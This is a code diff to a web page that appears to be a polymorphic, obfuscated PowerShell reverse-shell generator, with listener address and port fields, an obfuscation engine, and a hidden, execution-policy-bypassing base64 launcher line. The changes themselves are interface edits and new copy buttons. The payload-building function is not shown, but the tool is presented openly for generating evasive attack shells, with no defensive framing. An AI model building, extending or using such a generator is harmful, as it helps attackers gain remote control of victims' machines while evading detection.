@@ -154,6 +154,15 @@
             background: #2a3a5a;
             transform: translateY(-1px);
         }
+        .btn-success {
+            background: #065f46;
+            color: #e2e9ff;
+            border: 1px solid #0a7a5a;
+        }
+        .btn-success:hover { 
+            background: #0a7a5a;
+            transform: translateY(-1px);
+        }
         .btn-danger {
             background: #1a2a44;
             color: #f472b6;
@@ -298,6 +307,10 @@
             color: #94a3b8;
             border: 1px solid #1a2a44;
         }
+        .separator {
+            color: #2a3a5a;
+            padding: 0 4px;
+        }
     </style>
 </head>
 <body>
@@ -318,17 +331,17 @@
     <div class="input-area">
         <div class="input-row">
             <div>
-                <div class="label">LISTENER ADDRESS</div>
+                <div class="label">Listener Address</div>
                 <input type="text" id="ip" placeholder="192.168.45.45" value="192.168.45.45">
             </div>
             <div>
-                <div class="label">PORT</div>
+                <div class="label">Port</div>
                 <input type="text" id="port" placeholder="443" value="443">
             </div>
         </div>
 
         <div style="margin-bottom: 16px;">
-            <div class="label">OBFUSCATION ENGINE</div>
+            <div class="label">Obfuscation Engine</div>
             <div class="tech-stack">
                 <span class="tech-item">Random Variables</span>
                 <span class="tech-item">Shuffled Lookups</span>
@@ -363,7 +376,8 @@
 
         <div class="btn-group">
             <button class="btn btn-primary" id="generateBtn">Generate Shell</button>
-            <button class="btn btn-secondary" id="copyPayloadBtn" disabled>Copy Payload</button>
+            <button class="btn btn-secondary" id="copyObfuscatedBtn" disabled>Copy Obfuscated</button>
+            <button class="btn btn-success" id="copyReadableBtn" disabled>Copy Readable</button>
             <button class="btn btn-secondary" id="copyEncodedBtn" disabled>Copy Encoded</button>
             <button class="btn btn-secondary" id="copyFullBtn" disabled>Copy Command</button>
             <button class="btn btn-danger" id="clearBtn">Clear</button>
@@ -373,7 +387,7 @@
     <!-- Obfuscated Output -->
     <div style="padding:0 32px 20px;">
         <div class="output-header">
-            <span>OBFUSCATED PAYLOAD</span>
+            <span>Obfuscated Payload</span>
             <span class="badge">polymorphic</span>
             <span class="badge" style="background: #1a2a44; color: #f472b6;">randomized</span>
         </div>
@@ -386,7 +400,7 @@
     <!-- Decoded Output -->
     <div style="padding:0 32px 32px;">
         <div class="output-header">
-            <span>READABLE VERSION</span>
+            <span>Readable Version</span>
             <span class="badge">debug</span>
         </div>
         <div id="decodedOutput" class="output-box">
@@ -408,6 +422,9 @@
 <script>
 // Core obfuscation primitives
 let generationCounter = 0;
+let currentPayload = '';
+let currentReadable = '';
+let currentEncoded = '';
 
 function randVar(minLen = 4, maxLen = 20) {
     const pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -580,14 +597,12 @@ const compressChk = document.getElementById('compressMode');
 const generateBtn = document.getElementById('generateBtn');
 const obfuscatedOutput = document.getElementById('obfuscatedOutput');
 const decodedOutput = document.getElementById('decodedOutput');
-const copyPayloadBtn = document.getElementById('copyPayloadBtn');
+const copyObfuscatedBtn = document.getElementById('copyObfuscatedBtn');
+const copyReadableBtn = document.getElementById('copyReadableBtn');
 const copyEncodedBtn = document.getElementById('copyEncodedBtn');
 const copyFullBtn = document.getElementById('copyFullBtn');
 const clearBtn = document.getElementById('clearBtn');
 const generationIdSpan = document.getElementById('generationId');
-
-let currentPayload = '';
-let currentEncoded = '';
 
 function handleGenerate() {
     const ip = ipInput.value.trim();
@@ -604,6 +619,7 @@ function handleGenerate() {
         
         let payload = generatePolymorphicPayload(ip, port);
         currentPayload = payload;
+        currentReadable = payload;
 
         let displayPayload = payload;
         let readablePayload = payload;
@@ -617,6 +633,7 @@ function handleGenerate() {
         if (oneLinerChk.checked) {
             displayPayload = payload.replace(/\s+/g, ' ').trim();
             readablePayload = displayPayload;
+            currentReadable = readablePayload;
         }
 
         if (b64Chk.checked) {
@@ -626,16 +643,17 @@ function handleGenerate() {
             currentEncoded = encoded;
             const launcher = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
             displayPayload = launcher;
-            obfuscatedOutput.innerHTML = `# Base64 Launcher:\n${launcher}\n\n# EncodedCommand:\n${encoded}`;
+            obfuscatedOutput.textContent = launcher;
         } else {
             currentEncoded = '';
             obfuscatedOutput.textContent = displayPayload;
         }
 
-        decodedOutput.textContent = `# Readable version:\n${readablePayload}`;
+        decodedOutput.textContent = readablePayload;
 
-        copyPayloadBtn.disabled = false;
-        copyEncodedBtn.disabled = false;
+        copyObfuscatedBtn.disabled = false;
+        copyReadableBtn.disabled = false;
+        copyEncodedBtn.disabled = !b64Chk.checked;
         copyFullBtn.disabled = false;
 
         obfuscatedOutput.classList.add('flash');
@@ -671,37 +689,45 @@ function copyToClipboard(text, btn) {
 
 generateBtn.addEventListener('click', handleGenerate);
 
-copyPayloadBtn.addEventListener('click', () => {
-    const text = obfuscatedOutput.textContent;
-    copyToClipboard(text, copyPayloadBtn);
+// Copy just the obfuscated payload (without any extra text)
+copyObfuscatedBtn.addEventListener('click', () => {
+    let text = obfuscatedOutput.textContent;
+    // If in base64 mode, extract just the encoded command
+    if (b64Chk.checked && text.includes('EncodedCommand')) {
+        const match = text.match(/-EncodedCommand\s+(\S+)/);
+        if (match) {
+            text = match[1];
+        }
+    }
+    copyToClipboard(text, copyObfuscatedBtn);
 });
 
+// Copy the readable version
+copyReadableBtn.addEventListener('click', () => {
+    copyToClipboard(currentReadable, copyReadableBtn);
+});
+
+// Copy just the encoded part
 copyEncodedBtn.addEventListener('click', () => {
     if (currentEncoded) {
         copyToClipboard(currentEncoded, copyEncodedBtn);
     } else {
         const text = obfuscatedOutput.textContent;
-        const encodedMatch = text.match(/-EncodedCommand\s+(\S+)/);
-        if (encodedMatch) {
-            copyToClipboard(encodedMatch[1], copyEncodedBtn);
-        } else if (b64Chk.checked) {
-            const parts = text.split('\n\n');
-            if (parts.length > 1) {
-                const encodedPart = parts[1].replace('# EncodedCommand:', '').trim();
-                copyToClipboard(encodedPart, copyEncodedBtn);
-            } else {
-                copyToClipboard(text, copyEncodedBtn);
-            }
+        const match = text.match(/-EncodedCommand\s+(\S+)/);
+        if (match) {
+            copyToClipboard(match[1], copyEncodedBtn);
         } else {
             copyToClipboard(text, copyEncodedBtn);
         }
     }
 });
 
+// Copy the full PowerShell command
 copyFullBtn.addEventListener('click', () => {
     let fullCmd = obfuscatedOutput.textContent;
     if (!fullCmd.includes('powershell')) {
         if (b64Chk.checked) {
+            // Already has full command
             copyToClipboard(fullCmd, copyFullBtn);
         } else {
             const escaped = fullCmd.replace(/"/g, '`"');
@@ -714,25 +740,29 @@ copyFullBtn.addEventListener('click', () => {
 });
 
 clearBtn.addEventListener('click', () => {
-    obfuscatedOutput.innerHTML = '<span style="color: #4a5a7a;"># Click Generate to create polymorphic payload...</span>';
-    decodedOutput.innerHTML = '<span style="color: #4a5a7a;"># Decoded version will appear here after generation...</span>';
-    copyPayloadBtn.disabled = true;
+    obfuscatedOutput.textContent = '# Click Generate to create polymorphic payload...';
+    decodedOutput.textContent = '# Decoded version will appear here after generation...';
+    copyObfuscatedBtn.disabled = true;
+    copyReadableBtn.disabled = true;
     copyEncodedBtn.disabled = true;
     copyFullBtn.disabled = true;
     currentPayload = '';
+    currentReadable = '';
     currentEncoded = '';
 });
 
+// Click on output boxes to copy
 obfuscatedOutput.addEventListener('click', () => {
-    if (!copyPayloadBtn.disabled) {
+    if (!copyObfuscatedBtn.disabled) {
         const text = obfuscatedOutput.textContent;
-        copyToClipboard(text, copyPayloadBtn);
+        copyToClipboard(text, copyObfuscatedBtn);
     }
 });
 
 decodedOutput.addEventListener('click', () => {
-    const text = decodedOutput.textContent;
-    copyToClipboard(text, document.createElement('button'));
+    if (!copyReadableBtn.disabled) {
+        copyToClipboard(currentReadable, copyReadableBtn);
+    }
 });
 
 [ipInput, portInput].forEach(el => {
